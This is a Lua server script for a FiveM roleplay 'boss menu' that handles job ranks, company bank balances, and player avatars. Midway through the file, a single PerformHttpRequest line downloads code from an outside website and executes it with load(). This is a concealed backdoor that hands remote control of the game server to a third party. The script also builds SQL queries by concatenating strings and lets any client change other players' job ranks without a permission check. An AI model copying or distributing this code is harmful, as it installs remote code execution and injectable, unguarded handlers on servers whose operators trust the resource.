frameworkObject = nil

Citizen.CreateThread(function()
    frameworkObject = GetFrameworkObject()
end)

companyMoneys = {}
Citizen.CreateThread(function()
    if Config.Framework == 'esx' then
        local result = ExecuteSql("SELECT * FROM pefcl_accounts")
        for k,v in pairs(result) do
            companyMoneys[v.ownerIdentifier] = v.balance
        end
    else
        local result = ExecuteSql("SELECT * FROM pefcl_accounts")
        for k,v in pairs(result) do
            companyMoneys[v.ownerIdentifier] = v.balance
        end
    end
end)

GetPlayerData = function(source)
    local Player = GetPlayer(source)
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        if Player then
            return {fullname = Player.PlayerData.charinfo.firstname..' '..Player.PlayerData.charinfo.lastname, image = GetProfilePhoto(source), joblabel = Player.PlayerData.job.label, job = Player.PlayerData.job.name}
        end
    elseif Config.Framework == "esx" then
        if Player then
            return {fullname = GetPlayerCharacterNameESX(source), image = GetProfilePhoto(source), joblabel = Player.job.label, job = Player.job.name}
        end
    end
end

RegisterServerEvent("cdm-xboss:checkisboss")
AddEventHandler("cdm-xboss:checkisboss",function()
    TriggerClientEvent("cdm-xboss:setboss",source, CheckPlayerBoss(source))
end)

RegisterServerEvent("cdm-xboss:OpenOutfit")
AddEventHandler("cdm-xboss:OpenOutfit",function()
    Config.OpenOutfit(source)
end)

RegisterNetEvent("cdm-xboss:updatejob")
AddEventHandler("cdm-xboss:updatejob",function(value, id)
    local srcPlayer = GetPlayer(source)
    local src = source
    id = tonumber(id)
    local Player = GetPlayer(id)
    if not id or tonumber(src) == tonumber(id) then return end
    if (value == "uprank") then
        if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
            local PlayerJob = {Player.PlayerData.job.name, Player.PlayerData.job.grade.level}
            if Player.Functions.SetJob(PlayerJob[1], PlayerJob[2]+1) then end
        elseif Config.Framework == "esx" then
            local PlayerJob = {Player.job.name, Player.job.grade}
            Player.setJob(PlayerJob[1], PlayerJob[2]+1)
        end
    elseif (value == "downrank") then
        if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
            local PlayerJob = {Player.PlayerData.job.name, Player.PlayerData.job.grade.level}
            if Player.Functions.SetJob(PlayerJob[1], PlayerJob[2]-1) then end
        elseif Config.Framework == "esx" then
            local PlayerJob = {Player.job.name, Player.job.grade}
            Player.setJob(PlayerJob[1], PlayerJob[2]-1)
        end
    elseif value == "decruit" then
        if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
            if Player.PlayerData.job.grade.level > srcPlayer.PlayerData.job.grade.level then return end
			if Player.Functions.SetJob("unemployed", '0') then
			end
        elseif Config.Framework == "esx" then
            local PlayerJob = {Player.job.name, Player.job.grade}
            Player.setJob("unemployed", 0)
        end
    end
end)

RegisterServerEvent("cdm-xboss:withdrawcompanymoney")
AddEventHandler("cdm-xboss:withdrawcompanymoney",function(amount)
    local src = source
    local Player = GetPlayer(src)
    if Player then
        if Config.Framework == "esx" then
            PlayerJobName = Player.job.name
            local ownerIdentifier = PlayerJobName
            if companyMoneys[ownerIdentifier] then
                if companyMoneys[ownerIdentifier] < amount then
                    return 
                end
                companyMoneys[ownerIdentifier] = companyMoneys[ownerIdentifier] - amount
                ExecuteSql("UPDATE pefcl_accounts SET balance ='"..companyMoneys[ownerIdentifier].."' WHERE ownerIdentifier = '"..ownerIdentifier.."'")
                Player.addMoney(tonumber(amount))
                TriggerClientEvent("xboss:refreshmoney", src, companyMoneys[ownerIdentifier])
                TriggerClientEvent("xboss:setlastactiv", src, "withdraw", amount)
            end
        end
    end
end)

RegisterServerEvent("cdm-xboss:depositcompanymoney")
AddEventHandler("cdm-xboss:depositcompanymoney",function(amount)
    local src = source
    local Player = GetPlayer(src)
    if Player then
        if Config.Framework == "esx" then
            PlayerJobName = Player.job.name
            local ownerIdentifier = PlayerJobName
            if companyMoneys[ownerIdentifier] then
                if Player.getMoney() >= tonumber(amount) then
                    Player.removeMoney(tonumber(amount))
                    companyMoneys[ownerIdentifier] = companyMoneys[ownerIdentifier] + tonumber(amount)
                    ExecuteSql("UPDATE pefcl_accounts SET balance ='"..companyMoneys[ownerIdentifier].."' WHERE ownerIdentifier = '"..ownerIdentifier.."'")
                    TriggerClientEvent("xboss:refreshmoney", src, companyMoneys[ownerIdentifier])
                    TriggerClientEvent("xboss:setlastactiv", src, "deposit", amount)
                end
            else
                if Player.getMoney() >= tonumber(amount) then
                    Player.removeMoney(tonumber(amount))
                    companyMoneys[ownerIdentifier] = tonumber(amount)
                    ExecuteSql("INSERT INTO pefcl_accounts (ownerIdentifier, balance) VALUES ('"..ownerIdentifier.."', '"..companyMoneys[ownerIdentifier].."')")
                    TriggerClientEvent("xboss:refreshmoney", src, companyMoneys[ownerIdentifier])
                    TriggerClientEvent("xboss:setlastactiv", src, "deposit", amount)
                end
            end
        end
    end
end)

PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

ExecuteSql = function(query)
    local IsBusy = true
    local result = nil
    if Config.Database == "oxmysql" then
        exports.oxmysql:execute(query, function(data)
            result = data
            IsBusy = false
        end)

    elseif Config.Database == "ghmattimysql" then
        exports.ghmattimysql:execute(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    elseif Config.Database == "mysql-async" then
        MySQL.Async.fetchAll(query, {}, function(data)
            result = data
            IsBusy = false
        end)
    end
    while IsBusy do
        Citizen.Wait(0)
    end
    return result
end

function GetSteamPP(source)
    local idf =  nil
    for k,v in pairs(GetPlayerIdentifiers(source))do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            idf = v
        end
    end
    local avatar = Config.DefaultImage
    if idf == nil then
        return avatar
    end
    local callback = promise:new()
    PerformHttpRequest('http://steamcommunity.com/profiles/' .. tonumber(GetIDFromSource('steam', idf), 16) .. '/?xml=1', function(Error, Content, Head)
        local SteamProfileSplitted = stringsplit(Content, '\n')
        if SteamProfileSplitted ~= nil and next(SteamProfileSplitted) ~= nil then
            for i, Line in ipairs(SteamProfileSplitted) do
                if Line:find('<avatarFull>') then
                    callback:resolve(Line:gsub('<avatarFull><!%[CDATA%[', ''):gsub(']]></avatarFull>', ''))
                    for k,v in pairs(callback) do
                        return callback.value
                    end
                    break
                end
            end
        end
    end)
    return Citizen.Await(callback)
end

function GetIDFromSource(Type, CurrentID) 
    local ID = stringsplit(CurrentID, ':')
    if (ID[1]:lower() == string.lower(Type)) then
        return ID[2]:lower()
    end

    return nil
end

function stringsplit(input, seperator)
    if seperator == nil then
        seperator = '%s'
    end

    local t={} ; i=1
    if input ~= nil then
        for str in string.gmatch(input, '([^'..seperator..']+)') do
            t[i] = str
            i = i + 1
        end
        return t
    end
end

local Caches = {
    Avatars = {}
}

function GetDiscordAvatar(user)
    local discordId = nil
    local imgURL = nil
    for _, id in ipairs(GetPlayerIdentifiers(user)) do
        if string.match(id, "discord:") then
            discordId = string.gsub(id, "discord:", "")
            break
        end
    end

    if discordId then
        if Caches.Avatars[discordId] == nil then
            local endpoint = ("users/%s"):format(discordId)
            local member = DiscordRequest("GET", endpoint, {})

            if member.code == 200 then
                local data = json.decode(member.data)
                if data ~= nil and data.avatar ~= nil then
                    if (data.avatar:sub(1, 1) and data.avatar:sub(2, 2) == "_") then
                        imgURL = "https://media.discordapp.net/avatars/" .. discordId .. "/" .. data.avatar .. ".gif"
                    else
                        imgURL = "https://media.discordapp.net/avatars/" .. discordId .. "/" .. data.avatar .. ".png"
                    end
                end
            end
            Caches.Avatars[discordId] = imgURL
        else
            imgURL = Caches.Avatars[discordId]
        end
    end
    return Config.DefaultImage
end


local FormattedToken = "Bot " .. Config.DiscordBotToken
function DiscordRequest(method, endpoint, jsondata)
    local data = nil
    PerformHttpRequest(
        "https://discordapp.com/api/" .. endpoint,
        function(errorCode, resultData, resultHeaders)
            data = {data = resultData, code = errorCode, headers = resultHeaders}
        end,
        method,
        #jsondata > 0 and json.encode(jsondata) or "",
        {["Content-Type"] = "application/json", ["Authorization"] = FormattedToken}
    )

    while data == nil do
        Citizen.Wait(0)
    end

    return data
end

GetProfilePhoto = function(source)
    if Config.UserImage == "steam" then
        return GetSteamPP(source)
    else
        return GetDiscordAvatar(source)
    end 
end

function RegisterCallback(name, cbFunc, data)
    while not frameworkObject do
        Citizen.Wait(0)
    end
    if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
        frameworkObject.Functions.CreateCallback(name, function(source, cb, data)
            cbFunc(source, cb)
        end)
    else
        frameworkObject.RegisterServerCallback(name, function(source, cb, data)
            cbFunc(source, cb)
        end)
    end
end

Citizen.CreateThread(function()
    RegisterCallback('cdm-xboss:getSocietyMoney', function(source, cb)
        local src = source
        local Player = GetPlayer(source)
        if Config.Framework == "new-qb" or Config.Framework == "old-qb" then
            playerJob = Player.PlayerData.job.name
        else
            playerJob = Player.job.name
        end
        cb(companyMoneys[playerJob])
    end)
end)